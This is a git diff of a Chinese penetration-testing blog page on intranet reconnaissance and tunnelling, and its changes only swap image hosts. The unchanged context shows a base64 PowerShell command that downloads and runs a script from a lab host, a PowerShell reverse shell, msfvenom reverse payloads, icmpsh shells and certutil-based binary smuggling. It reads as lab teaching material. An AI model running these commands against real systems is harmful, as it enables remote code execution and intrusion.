@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210907113159.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -474,7 +474,7 @@
 <blockquote>
 <p>本文首发在我的个人公众号和个人博客，欢迎关注我的公众号：TeamsSix，我的博客：<a target="_blank" rel="noopener" href="https://teamssix.com/">teamssix.com</a></p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
 <h1 id="0x01-内网常见名词解释"><a href="#0x01-内网常见名词解释" class="headerlink" title="0x01 内网常见名词解释"></a>0x01 内网常见名词解释</h1><h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
 <p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p>
 <p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p>
@@ -496,13 +496,13 @@
 <p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p>
 <p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
 <p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/%E5%9F%9F%E6%9E%97.png" alt="域林"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/%E5%9F%9F%E6%9E%97.png" alt="域林"></p>
 <h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p>
 <p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p>
 <p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p>
 <h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
 <p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p>
 <h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
 <p><strong>域本地组</strong></p>
 <p>成员范围：所有的域；使用范围：自己所在的域</p>
@@ -667,7 +667,7 @@ LinkID&#x3D;135170 中的 about_Execution_Policies。
 <p>使用 –Enc 指定 Base64 编码内容</p>
 <pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-02-06_18-40-25.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-06_18-40-25.png"></p>
 <h1 id="0x03-本地工作组信息收集"><a href="#0x03-本地工作组信息收集" class="headerlink" title="0x03 本地工作组信息收集"></a>0x03 本地工作组信息收集</h1><h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul>
 <li>查看当前权限</li>
 </ul>
@@ -838,7 +838,7 @@ LinkID&#x3D;135170 中的 about_Execution_Policies。
 </ul>
 <h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
 <p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-02-11_12-59-56.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-11_12-59-56.png"></p>
 <h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p>
 <ul>
 <li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p>
@@ -847,7 +847,7 @@ LinkID&#x3D;135170 中的 about_Execution_Policies。
 </li>
 </ul>
 <p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-02-11_15-27-11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-11_15-27-11.png"></p>
 <p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p>
 <h1 id="0x04-域内信息收集"><a href="#0x04-域内信息收集" class="headerlink" title="0x04 域内信息收集"></a>0x04 域内信息收集</h1><h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p>
 <pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -972,7 +972,7 @@ Address:  192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>NES 脚本下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
 <pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nmap --script&#x3D;smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445&#x2F;tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:&#x2F;o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-02-23_17-38-11.png"></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-23_17-38-11.png"></p>
 <h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p>
 <p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p>
 <pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1084,7 +1084,7 @@ SharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing
 25、查找AS-REP Roastable用户(DontReqPreAuth)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>比如这里查询到域管理员的最短路径</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-02-25_14-00-42.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-25_14-00-42.png"></p>
 <blockquote>
 <p>路径由粗到细表示xx对xx有权限或关系</p>
 </blockquote>
@@ -1110,7 +1110,7 @@ SharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing
 <pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_14-46-46.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_14-46-46.png"></p>
 <h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1127,7 +1127,7 @@ SharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing
 <pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_15-43-51.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_15-43-51.png"></p>
 <h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.git
 cd icmptunnel
@@ -1155,7 +1155,7 @@ make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p>
 <pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_16-35-09.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_16-35-09.png"></p>
 <h1 id="0x07-lcx、netcat-和-socat-的使用"><a href="#0x07-lcx、netcat-和-socat-的使用" class="headerlink" title="0x07 lcx、netcat 和 socat 的使用"></a>0x07 lcx、netcat 和 socat 的使用</h1><h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p>
 <h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
 <li>内网端口转发</li>
@@ -1275,7 +1275,7 @@ powershell -w hidden -nop -c $a&#x3D;&#39;172.16.214.43&#39;;$b&#x3D;4444;$c&#x3
 &gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-05-28_12-36-45.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-05-28_12-36-45.png"></p>
 <p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p>
 <pre class="line-numbers language-none"><code class="language-none"># 控制端
 &gt; msfvenom -p cmd&#x2F;unix&#x2F;reverse_python lhost&#x3D;172.16.214.43 lport&#x3D;4444
@@ -1399,7 +1399,7 @@ windows10	172.16.214.21<span aria-hidden="true" class="line-numbers-rows"><span>
 <p>最后在 kali 下连接 win7</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-01_14-23-47.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_14-23-47.png"></p>
 <h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p>
 <pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -e cmd -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1426,7 +1426,7 @@ windows10	172.16.214.21<span aria-hidden="true" class="line-numbers-rows"><span>
 <p>在靶机上执行刚生成的 payload</p>
 <pre class="line-numbers language-none"><code class="language-none">powershell -e payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-01_15-35-24.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_15-35-24.png"></p>
 <h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p>
 <p>在服务端上安装 dnscat ，以 kali 为例</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git
@@ -1450,7 +1450,7 @@ session -i 1 		#	选择指定的会话进行交互<span aria-hidden="true" class
 <p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p>
 <p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p>
 <h2 id="2、安装-1"><a href="#2、安装-1" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-07_17-20-20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-20-20.png"></p>
 <p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo apt-get install iodine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1474,7 +1474,7 @@ session -i 1 		#	选择指定的会话进行交互<span aria-hidden="true" class
 
 <p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p>
 <p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-08_21-12-06.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_21-12-06.png"></p>
 <p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p>
 <h1 id="0x10-ew-的使用"><a href="#0x10-ew-的使用" class="headerlink" title="0x10 ew 的使用"></a>0x10 ew 的使用</h1><h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p>
 <p><a target="_blank" rel="noopener" href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p>
@@ -1523,7 +1523,7 @@ session -i 1 		#	选择指定的会话进行交互<span aria-hidden="true" class
 
 <p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p>
 <p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-09_10-24-45.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-09_10-24-45.png"></p>
 <h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p>
 <p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p>
 <pre class="line-numbers language-none"><code class="language-none">内网主机A（有公网IP） --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1613,7 +1613,7 @@ rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server<span aria-hidde
 <pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021&#x2F;06&#x2F;09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021&#x2F;06&#x2F;09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609155435.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609155435.png"></p>
 <h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p>
 <p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p>
 <p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p>
@@ -1657,9 +1657,9 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
 2021&#x2F;06&#x2F;09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609161458.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609161458.png"></p>
 <p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609161859.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609161859.png"></p>
 <p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p>
 <h1 id="0x12-nps-的使用"><a href="#0x12-nps-的使用" class="headerlink" title="0x12 nps 的使用"></a>0x12 nps 的使用</h1><h2 id="1、介绍-5"><a href="#1、介绍-5" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
 <p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p>
@@ -1673,18 +1673,18 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
 <pre class="line-numbers language-none"><code class="language-none">nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609170306.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609170306.png"></p>
 <p>nps 的使用也很简单，界面语言也可选择中文。</p>
 <p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609171610.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609171610.png"></p>
 <p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609172254.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172254.png"></p>
 <p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609172144.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172144.png"></p>
 <p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609172512.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172512.png"></p>
 <p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210609173211.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609173211.png"></p>
 <p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p>
 <h1 id="0x13-内网中绕过无法上传文件限制"><a href="#0x13-内网中绕过无法上传文件限制" class="headerlink" title="0x13 内网中绕过无法上传文件限制"></a>0x13 内网中绕过无法上传文件限制</h1><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p>
 <h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p>
@@ -1693,7 +1693,7 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
 <p>使用 PowerShell 进行 base64 解码</p>
 <pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210630172410.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210630172410.png"></p>
 <h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p>
 <p>使用 CertUtil 进行编码</p>
 <pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1701,7 +1701,7 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
 <p>使用 CertUtil 进行解码</p>
 <pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210630173155.png"> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210630173155.png"> </p>
 <h1 id="0x14-发现主机缺失补丁"><a href="#0x14-发现主机缺失补丁" class="headerlink" title="0x14 发现主机缺失补丁"></a>0x14 发现主机缺失补丁</h1><h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p>
